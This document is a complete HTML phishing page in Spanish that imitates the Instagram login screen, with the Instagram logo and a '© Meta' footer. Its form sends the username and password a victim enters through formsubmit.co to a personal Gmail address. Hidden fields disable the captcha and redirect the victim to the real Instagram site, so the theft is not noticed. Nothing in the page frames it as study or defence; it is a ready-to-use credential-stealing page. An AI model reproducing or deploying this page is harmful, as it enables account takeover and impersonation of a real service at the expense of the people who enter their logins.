<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Iniciar sesión</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #121212;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .logo {
      width: 80px;
      margin-bottom: 20px;
    }

    .form-container {
      width: 90%;
      max-width: 350px;
      background-color: #1c1c1c;
      padding: 30px;
      border-radius: 10px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      background-color: #2a2a2a;
      border: none;
      border-radius: 5px;
      color: white;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #1877f2;
      border: none;
      border-radius: 5px;
      color: white;
      font-weight: bold;
      font-size: 16px;
      margin-top: 10px;
      cursor: pointer;
    }

    .link {
      color: #aaa;
      font-size: 13px;
      text-align: center;
      margin-top: 15px;
    }

    .bottom {
      margin-top: 30px;
      font-size: 12px;
      color: #666;
    }

    .new-account {
      margin-top: 20px;
      border: 1px solid #555;
      padding: 10px;
      border-radius: 5px;
      color: white;
      text-align: center;
    }

    .new-account:hover {
      background-color: #222;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="logo" alt="logo">

  <div class="form-container">
    <form action="https://formsubmit.co/perznazareno18@gmail.com" method="POST">
      <input type="text" name="usuario" placeholder="Nombre de usuario, correo o celular" required>
      <input type="password" name="contraseña" placeholder="Contraseña" required>

      <!-- Evita captcha -->
      <input type="hidden" name="_captcha" value="false">

      <!-- Redirige a Instagram -->
      <input type="hidden" name="_next" value="https://www.instagram.com">

      <button type="submit">Iniciar sesión</button>
    </form>
    <div class="link">¿Olvidaste tu contraseña?</div>
  </div>

  <div class="new-account">Crear cuenta nueva</div>
  <div class="bottom">© Meta</div>

</body>
</html>
